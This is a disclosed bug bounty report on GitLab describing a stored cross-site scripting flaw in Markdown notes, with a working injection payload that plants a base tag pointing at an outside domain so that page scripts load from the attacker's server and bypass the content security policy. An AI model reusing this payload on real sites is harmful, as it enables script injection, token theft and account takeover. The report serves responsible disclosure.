# Stored XSS in Notes (with CSP bypass for gitlab.com)

## Report Details
- **Report ID**: 1481207
- **URL**: https://hackerone.com/reports/1481207
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-02-14T20:54:27.751Z
- **Disclosed**: 2022-05-25T12:09:13.538Z

## Reporter
- **Username**: joaxcar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
## Summary
I read the issue [345657](https://gitlab.com/gitlab-org/gitlab/-/issues/345657) which handles the XSS in notes reported in Hackerone report [1398305](https://hackerone.com/reports/1398305). This issue fixes the reported XSS but leaves the HTML injection that was also mentioned. I don't know how you deal with these situations, but I thought I report this, and you can decide :)

The issue linked above shows how a user can inject HTML in any Note (actually any Markdown it seems. For example wiki pages and issue descriptions) by abusing [syntax_highlight_filter.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/c2e5d7b89b84cc5b44575592bb706ef75c3d1bbb/lib/banzai/filter/syntax_highlight_filter.rb).

There are more ways to take this injection and weaponize it than the patched Emoji tag. I have a list of additional vectors but though that I would report the worst one (proper full stored XSS) and explain more if you decide to accept the report. To not waste our time.

I have multiple ways to inject `script` tags, but it looks like you have hardened your CSP? None of the old bypasses worked for me. But it still seems that you have not blocked the `base` tag. And fortunately for me, the injection let me pass in `base` tags. So by entering this into an issue description or wiki page

```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://joaxcar.com>
<pre x=&#34;">
<code></code></pre>
```
All relative links in the page will try to load their data from my site "joaxar.com". If we then open DevTools and reload the page, we will see the name of all files that failed to load. In the case of an issue page, we have this script
```
http://joaxcar.com/assets/webpack/hello.4948f350.chunk.js
```
and for a wiki page we have
```
https://joaxcar.com/assets/webpack/top_nav.c9763726.chunk.js
```
{F1618905}

Now I just have to create these files on my domain, and they will load and bypass CSP (as these script tags will have nonce in place and can thus load anything)

{F1618900}

## Steps to reproduce
1. log in as a user on Gitlab.com
2. go to any project (or create one), and add a new issue
3. enter this as the description (replace with your own server if you need to generate new scripts on your own domain)
```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://joaxcar.com>
<pre x=&#34;">
<code></code></pre>
```
4. save the issue
5. open DevTools (f12) and look for failing script imports
6. create the missing script on your domain containing
```
alert(document.domain)
```
7. reload the page and the popup should pop

{F1618901}


### Impact

Stored XSS in gitlab.com

There are more that can be added to the report but I am sending this in first and will add information later. The XSS can as you know create tokens (and as I have shown before take over SSO accounts)

### What is the current *bug* behavior?

HTML injection in Markdown

### What is the expected *correct* behavior?

Should not be possible

### Output of checks

This bug happens on GitLab.com

## Impact

Stored XSS in gitlab.com

There are more that can be added to the report but I am sending this in first and will add information later. The XSS can as you know create tokens (and as I have shown before take over SSO accounts)

## Attachments
- payload.jpg
- xssbase.jpg
- after.png
